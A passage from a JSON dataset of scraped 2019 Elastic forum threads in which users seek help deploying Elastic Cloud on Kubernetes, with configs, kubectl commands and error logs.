  },
  {
    "id": "a409c462-1197-49f0-aee9-31136991ec2d",
    "url": "https://discuss.elastic.co/t/public-ssled-access-with-ingress-not-working/189634",
    "title": "Public SSL'ed access with Ingress not working",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "tadgh",
    "date": "July 9, 2019, 10:17pm July 10, 2019, 7:33am July 10, 2019, 4:28pm July 11, 2019, 7:35pm July 19, 2019, 3:00pm July 19, 2019, 10:55pm July 25, 2019, 2:44am July 25, 2019, 8:57am July 25, 2019, 2:48pm July 29, 2019, 4:25pm",
    "body": "hey all, I have followed the quickstart guide from master branch of the docs, and all works perfectly well when i set the network type to LoadBalancer for kibana and elastic. I am able to curl the endpoints (with the self-signed cert). However, when I create an ingress resource, it appears as though all the backends fail the health checks, and the ingress refuses to route traffic to any of the pods. Here are my related configs: elastic.yaml apiVersion: elasticsearch.k8s.elastic.co/v1alpha1 kind: Elasticsearch metadata: name: quickstart spec: version: 7.1.0 http: service: spec: type: NodePort ports: - port: 9200 - targetPort: 9200 - protocol: TCP tls: selfSignedCertificate: subjectAltNames: - dns: myuniquedomain.ca ip: 34.98.124.3 nodes: - nodeCount: 3 config: node.master: true node.data: true node.ingest: true volumeClaimTemplates: - metadata: name: data spec: accessModes: - ReadWriteOnce resources: requests: storage: 10Gi storageClassName: standard elastic_ingress.yaml apiVersion: extensions/v1beta1 kind: Ingress metadata: name: myuniquedomain-ingress annotations: kubernetes.io/ingress.global-static-ip-name: myuniquedomain-static-ip spec: rules: - http: paths: - path: /elastic backend: serviceName: quickstart-es servicePort: 9200 However, the ingress shows all the backend as unhealthy. Attempting to curl with the new cert now returns: ╰─ curl --cacert ca.pem -u elastic:$PW https://myuniquedomain.ca/elastic curl: (35) OpenSSL SSL_connect: SSL_ERROR_SYSCALL in connection to myuniquedomain.ca:443 I have an A-record on the domain correctly pointing to the static IP as well. Am I missing something obvious? Thanks, --Gary",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "6c25154d-4d96-4da1-a106-0bcdd116179d",
    "url": "https://discuss.elastic.co/t/pvc-reuse-when-removing-pod/191898",
    "title": "PVC reuse when removing pod",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "LaurentGoderre",
    "date": "July 23, 2019, 6:55pm July 23, 2019, 7:21pm July 24, 2019, 1:32pm",
    "body": "When a pod is removed the previous PVC is not used and as new one is created. How do I ensure persistence when deleting pods?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "78b74716-3c37-4c65-8373-36b2323a1e66",
    "url": "https://discuss.elastic.co/t/air-gap-system-internal-error-occurred-failed-calling-webhook-validation-elasticsearch-elastic-co-post-https-elastic-webhook-service-elastic-system-svc-443-validate-elasticsearches-timeout-30s-service-unavailable/186396",
    "title": "Air Gap System: Internal error occurred: failed calling webhook \"validation.elasticsearch.elastic.co\": Post https://elastic-webhook-service.elastic-system.svc:443/validate-elasticsearches?timeout=30s: Service Unavailable",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "asp",
    "date": "June 19, 2019, 7:19am June 24, 2019, 8:25pm July 10, 2019, 1:19pm July 10, 2019, 1:22pm July 12, 2019, 10:42am July 24, 2019, 7:57am",
    "body": "Hi, I am following the quick start guide: https://www.elastic.co/guide/en/cloud-on-k8s/current/k8s-quickstart.html When I want to deploy the single node elasticsearch I get following error: Internal error occurred: failed calling webhook \"validation.elasticsearch.elastic.co\": Post https://elastic-webhook-service.elastic-system.svc:443/validate-elasticsearches?timeout=30s: Service Unavailable I assume that the problem is that my cluster is behind a proxy server. It can access a private docker registry and can communicate to internet via proxy. https_proxy is set in docker config and in environment. But later on production there will be NO proxy available. Should ECK work in air-gapped-systems? Thanks, Andreas",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "4ea8ed07-65bb-4773-a5cd-6585f85eba06",
    "url": "https://discuss.elastic.co/t/operator-updates/191933",
    "title": "Operator Updates",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "tadgh",
    "date": "July 24, 2019, 1:55am July 24, 2019, 7:32am",
    "body": "With how quickly ECK is updating/evolving, I'm wondering if we will be receiving upgrade path documentation for updating the operator(to 0.9 and beyond, for those of us who started with 8.0). This would definitely help me out. I could just snapshot the cluster, blow it away, rebuild it and restore with the newest version, but I would like to keep everything if at all possible. Is this possible? Thanks!",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "2ed52078-8dac-446c-b400-ff5c2c871696",
    "url": "https://discuss.elastic.co/t/customizing-roles-yml/191882",
    "title": "Customizing roles.yml",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "LaurentGoderre",
    "date": "July 23, 2019, 5:47pm July 23, 2019, 6:26pm July 23, 2019, 6:51pm",
    "body": "I an following the docs here to add a custom roles to Elasticsearch (via the roles.yml) but whatever I try doesn't get applied. github.com elastic/cloud-on-k8s/blob/f47a4259eed761f3bb93c9a5bc624a49d8c428f2/docs/elasticsearch-spec.asciidoc#custom-configuration-files-and-plugins [id=\"{p}-elasticsearch-specification\"] == Elasticsearch Specification There are a number of settings which need to be considered before going into production related to Elasticsearch but also to Kubernetes. Basic settings - JVM heap size - Node configuration - HTTP settings & TLS SANs - Resource limits - Pod Template - Volume claim templates Advanced settings - Virtual memory - Custom HTTP certificate - Secure settings - Custom plugins and bundles This file has been truncated. show original",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "e7215992-c3fd-4ca5-9bce-ead1ab5da904",
    "url": "https://discuss.elastic.co/t/elastic-webhook-service-not-found/191233",
    "title": "Elastic-webhook-service not found",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "t638403",
    "date": "July 18, 2019, 3:48pm July 18, 2019, 4:08pm July 23, 2019, 3:07pm July 23, 2019, 5:41pm",
    "body": "Hi, My elastic web hook service does not seem to work. I followed the guide for installing elk via operator using this guide: https://www.elastic.co/guide/en/cloud-on-k8s/current/k8s-quickstart.html But I have been so stupid to do the following. I downloaded the custom resource definitions and changed the image docker.elastic.co/eck/eck-operator:0.8.1 to docker.elastic.co/eck/eck-operator:0.9.0-rc2 and tried to deploy elasticsearch which kind of worked. However, when I tried to delete elasticsearch using kubectl delete -f ... I noticed that nothing changed. So I deleted the secrets and services manually. I changed the image back to 0.8.1 and tried to add the custom resources again, but i get this now: Error from server (InternalError): error when creating \"custom-resource-definition.elastic-system.yml\": Internal error occurred: failed calling webhook \"validation.license.elastic.co\": Post https://elastic-webhook-service.elastic-system.svc:443/validate-secrets?timeout=30s: service \"elastic-webhook-service\" not found Any help to fix this mess I created would be endlessly appreciated!",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "9fee511d-c72e-4095-b9a3-7e0a9f69fda8",
    "url": "https://discuss.elastic.co/t/single-instance-quickstart-cluster-crashes-after-10-minutes-with-eck-0-8-1/191086",
    "title": "Single Instance Quickstart Cluster Crashes after 10 Minutes With ECK 0.8.1",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Zorlack",
    "date": "July 17, 2019, 8:40pm July 18, 2019, 8:42am July 18, 2019, 1:40pm",
    "body": "I've been having some difficulty following the ECK Quickstart. To begin with I install the operator and instantiate a single node instance: [root@a0002-flexnet ~]# kubectl apply -f https://download.elastic.co/downloads/eck/0.8.1/all-in-one.yaml [SNIP] [root@a0002-flexnet ~]# cat <<EOF | kubectl apply -f - > apiVersion: elasticsearch.k8s.elastic.co/v1alpha1 > kind: Elasticsearch > metadata: > name: quickstart > spec: > version: 7.1.0 > nodes: > - nodeCount: 1 > config: > node.master: true > node.data: true > node.ingest: true > EOF elasticsearch.elasticsearch.k8s.elastic.co/quickstart created [root@a0002-flexnet ~]# kubectl get elasticsearches.elasticsearch.k8s.elastic.co NAME HEALTH NODES VERSION PHASE AGE quickstart red 7.1.0 Pending 35s [root@a0002-flexnet ~]# kubectl get elasticsearches.elasticsearch.k8s.elastic.co NAME HEALTH NODES VERSION PHASE AGE quickstart green 1 7.1.0 Operational 81s At this point I can open a connection to the quickstart-es service and authenticate correctly. So far so good! A describe reveals that it looks healthy: [root@a0002-flexnet ~]# kubectl describe elasticsearches.elasticsearch.k8s.elastic.co quickstart Name: quickstart Namespace: default Labels: <none> Annotations: kubectl.kubernetes.io/last-applied-configuration: {\"apiVersion\":\"elasticsearch.k8s.elastic.co/v1alpha1\",\"kind\":\"Elasticsearch\",\"metadata\":{\"annotations\":{},\"name\":\"quickstart\",\"namespace\":... API Version: elasticsearch.k8s.elastic.co/v1alpha1 Kind: Elasticsearch Metadata: Creation Timestamp: 2019-07-17T20:21:03Z Finalizers: expectations.finalizers.elasticsearch.k8s.elastic.co observer.finalizers.elasticsearch.k8s.elastic.co secure-settings.finalizers.elasticsearch.k8s.elastic.co licenses.finalizers.elasticsearch.k8s.elastic.co Generation: 2 Resource Version: 37578333 Self Link: /apis/elasticsearch.k8s.elastic.co/v1alpha1/namespaces/default/elasticsearches/quickstart UID: 661930de-a8d0-11e9-9f84-ac1f6b7678a2 Spec: Http: Service: Metadata: Spec: Tls: Nodes: Config: Node . Data: true Node . Ingest: true Node . Master: true Node Count: 1 Pod Template: Metadata: Creation Timestamp: <nil> Spec: Containers: <nil> Update Strategy: Version: 7.1.0 Status: Available Nodes: 1 Cluster UUID: GguK3wIwSAe_W2hWWIiVsg Health: green Master Node: quickstart-es-gbkkpdr7lm Phase: Operational Service: quickstart-es Zen Discovery: Minimum Master Nodes: 1 Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal Created 11m elasticsearch-controller Created pod quickstart-es-gbkkpdr7lm Normal StateChange 10m elasticsearch-controller Master node is now quickstart-es-gbkkpdr7lm Here's where things go off the rails a bit: After about 10 minutes, the elasticsearch pod falls over. {\"type\": \"server\", \"timestamp\": \"2019-07-17T20:32:22,527+0000\", \"level\": \"INFO\", \"component\": \"o.e.x.m.p.NativeController\", \"cluster.name\": \"quickstart\", \"node.name\": \"quickstart-es-gbkkpdr7lm\", \"cluster.uuid\": \"GguK3wIwSAe_W2hWWIiVsg\", \"node.id\": \"pUETgQReRNuWE0mvNi6q-A\", \"message\": \"Native controller process has stopped - no new native processes can be started\" } {\"level\":\"info\",\"ts\":1563395552.5241575,\"logger\":\"process-manager\",\"msg\":\"Update process state\",\"action\":\"terminate\",\"id\":\"es\",\"state\":\"failed\",\"pid\":15} {\"level\":\"info\",\"ts\":1563395552.531126,\"logger\":\"process-manager\",\"msg\":\"HTTP server closed\"} {\"level\":\"info\",\"ts\":1563395552.5324,\"logger\":\"process-manager\",\"msg\":\"Exit\",\"reason\":\"process failed\",\"code\":-1} Afterwards, the operator shows the service is degraded and it never recovers: [root@a0002-flexnet ~]# kubectl describe elasticsearches.elasticsearch.k8s.elastic.co quickstart Name: quickstart Namespace: default Labels: <none> Annotations: kubectl.kubernetes.io/last-applied-configuration: {\"apiVersion\":\"elasticsearch.k8s.elastic.co/v1alpha1\",\"kind\":\"Elasticsearch\",\"metadata\":{\"annotations\":{},\"name\":\"quickstart\",\"namespace\":... API Version: elasticsearch.k8s.elastic.co/v1alpha1 Kind: Elasticsearch Metadata: Creation Timestamp: 2019-07-17T20:21:03Z Finalizers: expectations.finalizers.elasticsearch.k8s.elastic.co observer.finalizers.elasticsearch.k8s.elastic.co secure-settings.finalizers.elasticsearch.k8s.elastic.co licenses.finalizers.elasticsearch.k8s.elastic.co Generation: 2 Resource Version: 37583256 Self Link: /apis/elasticsearch.k8s.elastic.co/v1alpha1/namespaces/default/elasticsearches/quickstart UID: 661930de-a8d0-11e9-9f84-ac1f6b7678a2 Spec: Http: Service: Metadata: Spec: Tls: Nodes: Config: Node . Data: true Node . Ingest: true Node . Master: true Node Count: 1 Pod Template: Metadata: Creation Timestamp: <nil> Spec: Containers: <nil> Update Strategy: Version: 7.1.0 Status: Cluster UUID: GguK3wIwSAe_W2hWWIiVsg Health: red Master Node: quickstart-es-gbkkpdr7lm Phase: Pending Service: quickstart-es Zen Discovery: Minimum Master Nodes: 1 Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal Created 11m elasticsearch-controller Created pod quickstart-es-gbkkpdr7lm Normal StateChange 10m elasticsearch-controller Master node is now quickstart-es-gbkkpdr7lm Warning Unhealthy 5s elasticsearch-controller Elasticsearch cluster health degraded After some time the pod goes into Waiting: CrashLoopBackOff. How do I start to troubleshoot this? What would cause this single-instance test cluster to crash reliably after 10 minutes? Many thanks! -Z",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "3e34c45a-0675-470d-8ad7-49b3f3a3a9e0",
    "url": "https://discuss.elastic.co/t/excessive-garbage-collection-when-i-try-to-vertically-scale-the-pods/190628",
    "title": "Excessive Garbage collection when I try to vertically scale the pods",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "tadgh",
    "date": "July 16, 2019, 2:01am July 16, 2019, 7:36am July 17, 2019, 4:05pm",
    "body": "Hello there, I've recently gotten the cluster up and running via ECK. in order to increase performance, I have allocated 3 nodes, each on an n1-highmem-2 instance. I have also increased the memory limit. I am now seeing a ton of garbage collection logs in ES. Here is my elastic service yaml: apiVersion: elasticsearch.k8s.elastic.co/v1alpha1 kind: Elasticsearch metadata: name: quickstart spec: version: 7.1.0 nodes: - nodeCount: 3 config: node.master: true node.data: true node.ingest: true podTemplate: spec: containers: - name: elasticsearch resources: limits: memory: \"6Gi\" cpu: \"100m\" volumeClaimTemplates: - metadata: name: elasticsearch-data spec: accessModes: - ReadWriteOnce resources: requests: storage: 10Gi storageClassName: standard My logs are absolutely filled with [gc][10417] overhead, spent [503ms] collecting in the last [1.1s] and it is making performance worse than on smaller clusters. Is there some way I'm supposed to increase memory limitations that isn't through the pod template? Cheers and thanks for the assistance.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "932d7b31-cc4c-4b81-8135-8f281f6f541f",
    "url": "https://discuss.elastic.co/t/how-to-give-built-password-in-eck-cr/190742",
    "title": "How to give built password in ECK CR",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "bikkina_mahesh",
    "date": "July 16, 2019, 1:32pm July 16, 2019, 3:06pm",
    "body": "Hi, How to configure password for user elastic while bootup of cluster through ECK CR. Thanks, Mahesh",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "c07a9f08-3bb8-4f14-a964-58d3355ec2da",
    "url": "https://discuss.elastic.co/t/how-to-use-persistent-storage-on-bare-metal-no-minikube/190224",
    "title": "How to use persistent Storage on bare metal? (no minikube)",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "asp",
    "date": "July 12, 2019, 11:29am July 12, 2019, 12:30pm",
    "body": "Hi, I am trying to bring a cluster alive using Elastic cloud on kubernetes. I'v setup a bare metal kubernetes cluster (no minikube). I am a little stuck with the persistent local storage descibed here: https://github.com/elastic/cloud-on-k8s/tree/master/local-volume Since I am not using GCE nor minikube, how do I setup this? Thanks, Andreas",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "0eac9876-1838-4f10-9434-de9fb4a6453c",
    "url": "https://discuss.elastic.co/t/master-not-discovery-exception/188344",
    "title": "Master not discovery exception",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "bikkina_mahesh",
    "date": "July 2, 2019, 3:57am July 10, 2019, 9:31am July 9, 2019, 5:25am July 9, 2019, 8:21am July 9, 2019, 4:58pm July 10, 2019, 5:30am July 10, 2019, 7:52am July 10, 2019, 9:45am",
    "body": "Using elastic search 7.1.0 My eck crd configuration : apiVersion: elasticsearch.k8s.elastic.co/v1alpha1 kind: Elasticsearch metadata: labels: controller-tools.k8s.io: \"1.0\" name: moss-es-cluster spec: version: \"7.1.0\" nodes: config: node.master: true node.data: true node.ingest: true podTemplate: metadata: labels: app: moss-es-node spec: containers: - name: elasticsearch resources: limits: memory: 4Gi cpu: 1 nodeCount: 3 this shows how to request 2Gi of persistent data storage for pods in this topology element volumeClaimTemplates: metadata: name: data spec: accessModes: ReadWriteOnce resources: requests: storage: 50Gi storageClassName: rook-block I am getting master not discovered exception and cluster is red state. logs of pods: ter-es-phkl755hgg}{z_DYKZ60Sl-3miLEm7oiuA}{p0-DzHkHRjS66M_APpnXXw}{10.2.1.23}{10.2.1.23:9300}{ml.machine_memory=12884901888, xpack.installed=true, ml.max_open_jobs=20}] from last-known cluster state; node term 0, last-accepted version 0 in term 0\" } {\"type\": \"server\", \"timestamp\": \"2019-06-28T06:04:15,345+0000\", \"level\": \"DEBUG\", \"component\": \"o.e.a.a.c.s.TransportClusterUpdateSettingsAction\", \"cluster.name\": \"moss-es-cluster\", \"node.name\": \"moss-es-cluster-es-phkl755hgg\", \"message\": \"timed out while retrying [cluster:admin/settings/update] after failure (timeout [30s])\" } {\"type\": \"server\", \"timestamp\": \"2019-06-28T06:04:15,345+0000\", \"level\": \"WARN\", \"component\": \"r.suppressed\", \"cluster.name\": \"moss-es-cluster\", \"node.name\": \"moss-es-cluster-es-phkl755hgg\", \"message\": \"path: /_cluster/settings, params: {}\" , \"stacktrace\": [\"org.elasticsearch.discovery.MasterNotDiscoveredException: null\", \"at org.elasticsearch.action.support.master.TransportMasterNodeAction$AsyncSingleAction$4.onTimeout(TransportMasterNodeAction.java:259) [elasticsearch-7.1.0.jar:7.1.0]\", \"at org.elasticsearch.cluster.ClusterStateObserver$ContextPreservingListener.onTimeout(ClusterStateObserver.java:322) [elasticsearch-7.1.0.jar:7.1.0]\", \"at org.elasticsearch.cluster.ClusterStateObserver$ObserverClusterStateListener.onTimeout(ClusterStateObserver.java:249) [elasticsearch-7.1.0.jar:7.1.0]\", \"at org.elasticsearch.cluster.service.ClusterApplierService$NotifyTimeout.run(ClusterApplierService.java:555) [elasticsearch-7.1.0.jar:7.1.0]\", \"at org.elasticsearch.common.util.concurrent.ThreadContext$ContextPreservingRunnable.run(ThreadContext.java:681) [elasticsearch-7.1.0.jar:7.1.0]\", \"at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128) [?:?]\", \"at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628) [?:?]\",",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "dc797327-a5ee-4c97-8578-d5285a93e95b",
    "url": "https://discuss.elastic.co/t/public-availability-of-eck-operator-0-9-0-snapshot-images/189663",
    "title": "Public availability of eck-operator 0.9.0-SNAPSHOT images",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "ron18219",
    "date": "July 10, 2019, 6:16am July 10, 2019, 7:39am",
    "body": "I see PR https://github.com/elastic/cloud-on-k8s/pull/1184 was recently resolved implying that ECK snapshot releases are now being pushed to a docker registry. Are these eck-operator 0.9.0-SNAPSHOT images publicly available for testing? If so, how can they be accessed and is there a way to query a elastic docker registry for them?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "c72705a2-d424-4923-8bbb-be050140716a",
    "url": "https://discuss.elastic.co/t/installing-eck-crds-on-gke-1-12-without-validations/187927",
    "title": "Installing ECK CRDs on GKE 1.12 without Validations",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Nitish_Krishna",
    "date": "June 27, 2019, 8:50pm July 9, 2019, 8:24am",
    "body": "I am trying to deploy ECK resources on a GKE cluster as documented here: https://www.elastic.co/elasticsearch-kubernetes In the YAML file Elastic Cloud K8S Resources YAML there are 8 CRDs defined these have validation sections. The CRD Validation is a beta feature in K8s 1.15 and not supported yet in GKE 1.12 : https://kubernetes.io/docs/tasks/access-kubernetes-api/custom-resources/custom-resource-definitions/#validation Will there be any issue installing these CRD resources WITHOUT the validation section? Thanks!",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "d5b88d2e-8bc8-4c05-a37f-90be7def3006",
    "url": "https://discuss.elastic.co/t/helm-chart-and-es-5-6/189420",
    "title": "Helm chart and ES 5.6",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "mfcanovas",
    "date": "July 8, 2019, 7:52pm",
    "body": "Is it possible to use official helm chart with the 5.6 docker image? I tried it by setting image and major version values but the pod remains on unready status with no errors in log. Thanks",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "9fc85f9f-2c22-45b8-a9e2-ecf52536c416",
    "url": "https://discuss.elastic.co/t/cant-configure-a-multi-node-cluster-using-elastic-kubernetes/188562",
    "title": "Can't configure a multi-node cluster using Elastic-Kubernetes",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Chaitanya_Kaul",
    "date": "July 2, 2019, 7:56pm July 2, 2019, 7:22pm July 30, 2019, 7:22pm",
    "body": "Hello guys, I was trying to configure a multi node cluster using cloud-on-k8s but I'm unable to achieve that. Basically I created a NFS server as a pod and created two seperate PVs to mount the same end-point so that my 2 node cluster can create 2 PVcs to lock PVs. But it seems I'm getting this error {\"level\":\"info\",\"ts\":1562096740.5542755,\"logger\":\"process-manager\",\"msg\":\"Update process state\",\"action\":\"initialization\",\"id\":\"es\",\"state\":\"failed\",\"pid\":0} {\"level\":\"info\",\"ts\":1562096740.554345,\"logger\":\"process-manager\",\"msg\":\"Starting...\"} {\"level\":\"info\",\"ts\":1562096740.5548103,\"logger\":\"process-manager\",\"msg\":\"Update process state\",\"action\":\"start\",\"id\":\"es\",\"state\":\"started\",\"pid\":18} {\"level\":\"info\",\"ts\":1562096740.554846,\"logger\":\"process-manager\",\"msg\":\"Started\"} {\"level\":\"info\",\"ts\":1562096740.55715,\"logger\":\"keystore-updater\",\"msg\":\"Waiting for Elasticsearch to be ready\"} OpenJDK 64-Bit Server VM warning: Option UseConcMarkSweepGC was deprecated in version 9.0 and will likely be removed in a future release. {\"type\": \"server\", \"timestamp\": \"2019-07-02T19:45:41,922+0000\", \"level\": \"WARN\", \"component\": \"o.e.b.ElasticsearchUncaughtExceptionHandler\", \"cluster.name\": \"ad-tools-cluster\", \"node.name\": \"ad-tools-cluster-es-hkj7lr8khw\", \"message\": \"uncaught exception in thread [main]\" , \"stacktrace\": [\"org.elasticsearch.bootstrap.StartupException: java.lang.IllegalStateException: failed to obtain node locks, tried [[/usr/share/elasticsearch/data]] with lock id [0]; maybe these locations are not writable or multiple nodes were started without increasing [node.max_local_storage_nodes] (was [1])?\", \"at org.elasticsearch.bootstrap.Elasticsearch.init(Elasticsearch.java:163) ~[elasticsearch-7.1.0.jar:7.1.0]\", \"at org.elasticsearch.bootstrap.Elasticsearch.execute(Elasticsearch.java:150) ~[elasticsearch-7.1.0.jar:7.1.0]\", \"at org.elasticsearch.cli.EnvironmentAwareCommand.execute(EnvironmentAwareCommand.java:86) ~[elasticsearch-7.1.0.jar:7.1.0]\", \"at org.elasticsearch.cli.Command.mainWithoutErrorHandling(Command.java:124) ~[elasticsearch-cli-7.1.0.jar:7.1.0]\", \"at org.elasticsearch.cli.Command.main(Command.java:90) ~[elasticsearch-cli-7.1.0.jar:7.1.0]\", \"at org.elasticsearch.bootstrap.Elasticsearch.main(Elasticsearch.java:115) ~[elasticsearch-7.1.0.jar:7.1.0]\", \"at org.elasticsearch.bootstrap.Elasticsearch.main(Elasticsearch.java:92) ~[elasticsearch-7.1.0.jar:7.1.0]\", \"Caused by: java.lang.IllegalStateException: failed to obtain node locks, tried [[/usr/share/elasticsearch/data]] with lock id [0]; maybe these locations are not writable or multiple nodes were started without increasing [node.max_local_storage_nodes] (was [1])?\", \"at org.elasticsearch.env.NodeEnvironment.&lt;init&gt;(NodeEnvironment.java:297) ~[elasticsearch-7.1.0.jar:7.1.0]\", \"at org.elasticsearch.node.Node.&lt;init&gt;(Node.java:272) ~[elasticsearch-7.1.0.jar:7.1.0]\", \"at org.elasticsearch.node.Node.&lt;init&gt;(Node.java:252) ~[elasticsearch-7.1.0.jar:7.1.0]\", \"at org.elasticsearch.bootstrap.Bootstrap$5.&lt;init&gt;(Bootstrap.java:211) ~[elasticsearch-7.1.0.jar:7.1.0]\", \"at org.elasticsearch.bootstrap.Bootstrap.setup(Bootstrap.java:211) ~[elasticsearch-7.1.0.jar:7.1.0]\", \"at org.elasticsearch.bootstrap.Bootstrap.init(Bootstrap.java:325) ~[elasticsearch-7.1.0.jar:7.1.0]\", \"at org.elasticsearch.bootstrap.Elasticsearch.init(Elasticsearch.java:159) ~[elasticsearch-7.1.0.jar:7.1.0]\", \"... 6 more\"] } {\"level\":\"info\",\"ts\":1562096741.9779282,\"logger\":\"process-manager\",\"msg\":\"Update process state\",\"action\":\"terminate\",\"id\":\"es\",\"state\":\"failed\",\"pid\":18} {\"level\":\"info\",\"ts\":1562096741.9779992,\"logger\":\"process-manager\",\"msg\":\"Exit\",\"reason\":\"process failed\" This is what I see on Kubernetes logs for the second node which is trying to start-up. I tested my NFS volume(by creating a pod that mounts and writes dates) and it does work. I think I'm going wrong with respect to the way PVs are supposed to be configured.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "341e25bd-00d4-4d06-a3f0-0371d83b7277",
    "url": "https://discuss.elastic.co/t/es-pod-crashloopbackoff-likely-root-cause-java-nio-file-filealreadyexistsexception/187824",
    "title": "ES pod CrashLoopBackOff , Likely root cause: java.nio.file.FileAlreadyExistsException",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Zanoubia",
    "date": "June 27, 2019, 12:37pm June 27, 2019, 12:44pm",
    "body": "Using elasticsearch docker image 7.2.0, in a kubernetes cluster: ES describe: Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal Created 45m elasticsearch-controller Created pod quickstart-es-9smrn67vmv Normal StateChange 44m elasticsearch-controller Master node is now quickstart-es-9smrn67vmv Warning Unhealthy 32m elasticsearch-controller Elasticsearch cluster health degraded Pod logs: {\"level\":\"info\",\"ts\":1561636379.3319728,\"logger\":\"keystore-updater\",\"msg\":\"Waiting for Elasticsearch to be ready\"} OpenJDK 64-Bit Server VM warning: Option UseConcMarkSweepGC was deprecated in version 9.0 and will likely be removed in a future release. Exception in thread \"main\" org.elasticsearch.bootstrap.BootstrapException: java.nio.file.FileAlreadyExistsException: /usr/share/elasticsearch/config/elasticsearch.keystore.tmp Likely root cause: java.nio.file.FileAlreadyExistsException: /usr/share/elasticsearch/config/elasticsearch.keystore.tmp at java.base/sun.nio.fs.UnixException.translateToIOException(UnixException.java:94) at java.base/sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:111) at java.base/sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:116) at java.base/sun.nio.fs.UnixFileSystemProvider.newByteChannel(UnixFileSystemProvider.java:219) at java.base/java.nio.file.spi.FileSystemProvider.newOutputStream(FileSystemProvider.java:478) at java.base/java.nio.file.Files.newOutputStream(Files.java:222) at org.apache.lucene.store.FSDirectory$FSIndexOutput.<init>(FSDirectory.java:411) at org.apache.lucene.store.FSDirectory$FSIndexOutput.<init>(FSDirectory.java:407) at org.apache.lucene.store.FSDirectory.createOutput(FSDirectory.java:255) at org.elasticsearch.common.settings.KeyStoreWrapper.save(KeyStoreWrapper.java:462) at org.elasticsearch.bootstrap.Bootstrap.loadSecureSettings(Bootstrap.java:242) at org.elasticsearch.bootstrap.Bootstrap.init(Bootstrap.java:305) at org.elasticsearch.bootstrap.Elasticsearch.init(Elasticsearch.java:159) at org.elasticsearch.bootstrap.Elasticsearch.execute(Elasticsearch.java:150) at org.elasticsearch.cli.EnvironmentAwareCommand.execute(EnvironmentAwareCommand.java:86) at org.elasticsearch.cli.Command.mainWithoutErrorHandling(Command.java:124) at org.elasticsearch.cli.Command.main(Command.java:90) at org.elasticsearch.bootstrap.Elasticsearch.main(Elasticsearch.java:115) at org.elasticsearch.bootstrap.Elasticsearch.main(Elasticsearch.java:92) Refer to the log for complete error details. {\"level\":\"info\",\"ts\":1561636381.358021,\"logger\":\"process-manager\",\"msg\":\"Update process state\",\"action\":\"terminate\",\"id\":\"es\",\"state\":\"failed\",\"pid\":14} {\"level\":\"info\",\"ts\":1561636381.3581822,\"logger\":\"process - manager\",\"msg\":\"Exit\",\"reason\":\"process failed\",\"code\":1}",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "e36bbb75-01be-4fa6-bde7-ec163e8b424d",
    "url": "https://discuss.elastic.co/t/eck-0-8-1-released/187396",
    "title": "ECK 0.8.1 Released",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Anurag_Gupta",
    "date": "June 25, 2019, 5:11pm",
    "body": "Elastic Cloud on Kubernetes 0.8.1 released! This release adds support for version 7.2. Info about 7.2 can be found here: https://www.elastic.co/blog/elastic-stack-7-2-0-released",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "d5768066-065e-4d49-81c8-ff64269ecdf6",
    "url": "https://discuss.elastic.co/t/killing-pod/186745",
    "title": "Killing pod",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "t0ffel",
    "date": "June 20, 2019, 6:36pm June 24, 2019, 8:32pm June 24, 2019, 8:50pm June 25, 2019, 7:39am June 25, 2019, 1:41pm June 25, 2019, 3:15pm",
    "body": "I'm trying a simple 3-node cluster. All 3 are masters/data/ingest. If I delete all 3 pods manually the pods will spin-up again, they will have the same names, however they'll fail to join the cluster. According to the logs they'll be looking for some completely different non-existent master nodes. Is there a way to resolve this issue? i.e. to ensure that even in case of deletion the pod try to join the existing masters. Where does the operator save information about the masters?",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "c27c3d3e-8369-4785-a126-b7611bd37098",
    "url": "https://discuss.elastic.co/t/elasticsearch-nodes-get-killed-by-kubernetes-due-to-oom/186682",
    "title": "Elasticsearch nodes get killed by kubernetes due to OOM",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
